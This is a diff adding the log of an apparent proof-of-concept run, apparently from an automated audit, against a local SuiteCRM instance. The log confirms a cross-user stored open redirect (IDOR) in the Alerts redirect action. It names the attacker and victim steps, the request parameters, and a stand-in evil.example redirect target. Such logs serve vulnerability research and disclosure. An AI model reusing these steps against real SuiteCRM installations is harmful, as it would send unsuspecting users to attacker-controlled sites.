@@ -1,0 +1,17 @@
+<frozen site>:107: RuntimeWarning: Unexpected value in sys.prefix, expected /opt/cvehunter/claude_audit/SuiteCRM/exploits/.venv, got /opt/cvehunter/claude_audit/SuiteCRM/exploits/VULN-055/../.venv
+<frozen site>:107: RuntimeWarning: Unexpected value in sys.exec_prefix, expected /opt/cvehunter/claude_audit/SuiteCRM/exploits/.venv, got /opt/cvehunter/claude_audit/SuiteCRM/exploits/VULN-055/../.venv
+========================================================================
+VULN-055: Alerts action_redirect -- cross-user stored open redirect
+target: http://localhost:33116
+========================================================================
+[SETUP] Provisioning two independent low-privileged users: attacker + victim
+[OK] attacker=mod_b47e797b victim=mod_21c85671 (unrelated accounts, no ownership between them)
+[STEP] ATTACKER plants an alert with a malicious url_redirect (module=Alerts action=add -- their own alert, legitimately owned)
+[OK] action=add -> HTTP 200 body='{"result":1}'
+[STEP] Reading back the planted alert's id (matched on reminder_id)
+[OK] attacker's alert id=2d117fe9-8915-430c-b59a-76570efa55c9 (assigned_user_id=attacker, confirmed via DB)
+[STEP] VICTIM (different user, never saw the attacker's alert) triggers module=Alerts&action=redirect&record=2d117fe9-8915-430c-b59a-76570efa55c9
+[PROOF] HTTP 301 Moved Permanently
+[PROOF] Location: 'https://evil-cvehunter-c055_7edd5dd5.example/redir'  (victim session, attacker-owned alert id)
+[OK] A user with ZERO relationship to the alert's owner was redirected off-site to the attacker's URL -- action_redirect has no owner/ACL scoping on the record lookup (cross-user IDOR).
+==> VULN-055: CONFIRMED — victim mod_21c85671 redirected (HTTP 301) to https://evil-cvehunter-c055_7edd5dd5.example/redir via attacker's alert 2d117fe9-8915-430c-b59a-76570efa55c9
